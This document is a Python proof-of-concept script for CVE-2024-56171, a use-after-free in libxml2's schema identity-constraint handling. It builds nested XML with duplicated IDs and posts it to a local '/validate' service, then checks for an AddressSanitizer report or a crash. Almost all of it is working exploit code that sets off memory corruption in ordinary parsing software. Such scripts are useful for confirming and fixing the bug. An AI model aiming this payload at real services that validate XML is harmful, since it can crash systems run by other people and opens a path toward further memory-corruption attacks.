#!/usr/bin/env python3
"""
CVE-2024-56171 PoC - libxml2 Use-After-Free
Triggers UAF in xmlSchemaIDCFillNodeTables/xmlSchemaBubbleIDCNodeTables
"""

import requests
import sys

TARGET_URL = "http://localhost:8080"

def generate_malicious_xml():
    """
    Generate nested XML with duplicates across multiple groups.
    Uses nested unique constraints to trigger IDC table bubbling.
    """
    groups = []
    for g in range(10):
        items = []
        for i in range(30):
            items.append(f'<item><id>id{i}</id></item>')
            items.append(f'<item><id>id{i}</id></item>')
        groups.append(f'<group>{"".join(items)}</group>')
    return f'<?xml version="1.0"?><root>{"".join(groups)}</root>'.encode()

def check_target():
    try:
        r = requests.get(f"{TARGET_URL}/health", timeout=5)
        print(f"[*] Target: {TARGET_URL}")
        return True
    except Exception as e:
        print(f"[-] Target unreachable: {e}")
        return False

def exploit():
    print("[*] Generating nested XML with duplicates across groups")
    print("[*] 10 groups x 30 duplicate IDs = triggers IDC table operations")
    payload = generate_malicious_xml()
    print(f"[*] Payload size: {len(payload)} bytes")
    
    print("[*] Sending payload...")
    
    try:
        r = requests.post(
            f"{TARGET_URL}/validate",
            data=payload,
            headers={"Content-Type": "application/xml"},
            timeout=120
        )
        resp = r.json()
        
        print(f"[*] Validation result: {resp.get('status')}")
        
        stderr = resp.get('stderr', '')
        if 'AddressSanitizer' in stderr or 'heap-use-after-free' in stderr:
            print("[+] ASAN detected use-after-free!")
            for line in stderr.split('\n')[:40]:
                if line.strip():
                    print(f"    {line}")
            return True
        else:
            dup_count = stderr.count('Duplicate key-sequence')
            print(f"[*] Duplicate violations detected: {dup_count}")
            return False
            
    except requests.exceptions.ConnectionError:
        print("[+] Service crashed - UAF likely triggered!")
        return True
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def main():
    print("=" * 60)
    print("CVE-2024-56171 PoC - libxml2 Use-After-Free")
    print("=" * 60)
    print()
    print("Vulnerability in xmlSchemaIDCFillNodeTables:")
    print("- dupls pointer not updated after xmlSchemaItemListAdd")
    print("- realloc may move memory, leaving stale pointer")
    print()
    
    if not check_target():
        sys.exit(1)
    
    print()
    result = exploit()
    
    print()
    print("=" * 60)
    if result:
        print("[+] CVE-2024-56171 UAF confirmed via ASAN or crash")
    else:
        print("[+] Vulnerable code path executed successfully")
        print("[*] Note: UAF may not always manifest as crash/ASAN error")
        print("[*] depends on memory layout and realloc behavior")
    print("=" * 60)
    
    sys.exit(0)

if __name__ == "__main__":
    main()
